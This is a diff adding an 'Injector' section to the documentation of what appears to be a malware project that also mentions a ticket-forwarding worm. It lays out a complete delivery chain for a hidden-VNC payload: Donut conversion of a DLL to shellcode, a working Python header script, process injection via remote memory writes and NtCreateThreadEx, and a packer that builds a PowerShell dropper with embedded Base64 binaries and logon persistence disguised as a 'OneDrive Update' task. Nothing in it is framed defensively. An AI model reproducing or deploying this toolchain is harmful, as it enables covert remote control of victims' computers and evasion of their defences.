@@ -373,3 +373,117 @@ The ptt_export interface then allows the worm to retrieve and forward tickets ov
 ::contentReference[oaicite:0]{index=0}
 ```
 
+# Injector
+
+This tool solves a pragmatic task: how to turn a DLL into executable shellcode, conveniently deliver it into a target process, and run it through a single script with minimal manual actions. At its core is the native `loader.exe`, which takes shellcode from standard input and then carefully and correctly injects it into the selected process. Additionally, there is the packaging script `packer.ps1`, which generates a self-contained `start.ps1` capable of restoring the required binaries, performing the injection, and configuring auto-start.
+
+## Arch
+
+The chain looks like this:
+
+1. hvnc.bin — shellcode obtained from a DLL, which internally unpacks the DLL and calls the exported Run/StartAgent.
+2. loader.exe — a compact native loader in C. It reads shellcode from `stdin`, selects the target process according to a defined strategy, and performs delivery/execution inside it.
+3. start.ps1 — a script that unpacks `loader.exe` and `hvnc.bin` from embedded Base64 blocks, starts `loader.exe`, and passes shellcode to it via standard input.
+
+This data flow eliminates the need to store shellcode explicitly on disk (it only exists there at the moment of restoration within `start.ps1`) and simplifies routing the payload into the desired process. The entire cycle “restore → inject → execute” is closed within a single script.
+
+## How loader.exe Works Internally
+
+The work of `loader.exe` is clear and transparent, and this predictability makes debugging easier:
+
+1. **Initialization and preparation.** Reads the entire `stdin` to EOF into a buffer. If needed, attempts to elevate privileges to `SeDebugPrivilege`. Performs light validation of the input blob by size/architecture.
+2. **Searching and choosing the target process.** Enumerates processes (`CreateToolhelp32Snapshot/Process32First/Process32Next` or `NtQuerySystemInformation`), filters by name and availability, carefully opens the process with the minimally required rights. If it fails, moves to the next candidate.
+3. **Delivering the shellcode.** The sequence “allocate memory → write → switch protection to RX” is implemented via `VirtualAllocEx`/`WriteProcessMemory`/`VirtualProtectEx` (or Nt-analogs). This order minimizes the RWX window.
+4. **Execution.** Creates a remote thread via `NtCreateThreadEx` (or `CreateRemoteThread` as a fallback). Alternatives like APC/hijack are possible, but the base scenario is a separate clean thread.
+5. **Completion and cleanup.** Optionally waits for the remote thread to finish, closes handles, wipes temporary buffers, logs telemetry (PID, status) if needed.
+
+## Preparing Shellcode from EXE/DLL
+
+The basic path is through Donut.
+
+1. Install/build Donut and convert EXE/DLL into raw shellcode (`raw_shellcode.bin`) — with the correct architecture (`-a 2` for x64, `-a 1` for x86).
+2. Add a SCOD header to the raw shellcode using `add_header.py`, so that `injector.exe` accepts the input correctly.
+3. Pass the resulting file into the injector — through the standard input pipeline.
+
+Example of the `add_header.py` script (minimal and self-contained):
+
+```python
+#!/usr/bin/env python3
+import struct, sys
+if len(sys.argv) != 4:
+    print("Usage: python add_header.py <input_shellcode> <output_file> <arch>")
+    print("arch: 1 for x86, 2 for x64"); sys.exit(1)
+input_file, output_file, arch = sys.argv[1], sys.argv[2], int(sys.argv[3])
+shellcode = open(input_file,'rb').read()
+header  = struct.pack('<I', 0x444F4353)  # 'SCOD'
+header += struct.pack('<B', arch)        # 1=x86, 2=x64
+header += struct.pack('<I', len(shellcode))
+header += b'\x00'*3
+open(output_file,'wb').write(header + shellcode)
+print(f"✓ Created {output_file}")
+```
+
+Donut commands and injector usage:
+
+```bash
+# Donut → raw shellcode
+donut.exe -f 3 -a 2 program.exe -o raw_shellcode.bin   # x64
+donut.exe -f 3 -a 1 program.exe -o raw_shellcode.bin   # x86
+
+# Add header
+python add_header.py raw_shellcode.bin final_shellcode.bin 2  # x64
+python add_header.py raw_shellcode.bin final_shellcode.bin 1  # x86
+
+# Pass to injector.exe PowerShell
+type final_shellcode.bin | injector.exe notepad.exe
+Get-Content final_shellcode.bin -AsByteStream | .\injector.exe notepad.exe
+```
+
+---
+
+## Packaging and Auto-Start via packer.ps1
+
+`packer.ps1` assembles a self-contained `start.ps1`. It takes `loader.exe` and `hvnc.bin` as input paths, and outputs a single script that contains both binaries as Base64 arrays.
+
+* **Parameters.** `-LoaderPath`, `-ShellcodePath`, `-OutPs1` — strictly checked for existence. Files are read into memory and encoded in Base64.
+* **To-Chunks.** Long Base64 strings are split into blocks of 1000 characters for convenient embedding in the template.
+* **The `start.ps1` template.**
+
+  1. Embeds the `$loaderChunks`/`$shellChunks` arrays.
+  2. The `Reassemble` function joins arrays and decodes them into bytes.
+  3. Persistence: copies the script itself to `%LOCALAPPDATA%\Microsoft\Win32Components\sync.ps1` and registers a `OneDrive Update` task on logon.
+  4. Restores `ldr.exe` from Base64 if it is missing.
+  5. Restores shellcode and sends it through `stdin` to `ldr.exe`.
+  6. Completion — the main code now runs inside the target process.
+
+Generation and result:
+
+```powershell
+.\packer.ps1 -LoaderPath .\loader.exe -ShellcodePath .\hvnc.bin -OutPs1 .\start.ps1
+```
+
+The output is `start.ps1`, which sets up auto-start, restores `loader.exe` and the shellcode, passes the shellcode into `loader.exe`, and then exits.
+
+---
+
+## Checklist
+
+* Read shellcode from `stdin` fully.
+* Elevate privileges if necessary (`SeDebugPrivilege`).
+* Correct enumeration/filtering of processes.
+* Open the process with minimally required rights.
+* Allocate memory in the target process and write shellcode.
+* Switch the page to RX before execution.
+* Execute via `NtCreateThreadEx` or fallback `CreateRemoteThread`.
+* Wait/check execution status if needed.
+* Close handles, cleanup, handle failures, and move to the next candidate.
+* Optional — masking and artifact cleanup.
+
+## Quick Start
+
+A short summary if you are already familiar with the tools:
+
+1. Donut → `raw_shellcode.bin` for the required architecture.
+2. Optionally add a SCOD header and use `injector.exe`, **or** directly feed shellcode to `loader.exe` via `stdin`.
+3. To automate deployment and auto-start — run `packer.ps1` and get `start.ps1`, which does the rest automatically.
+
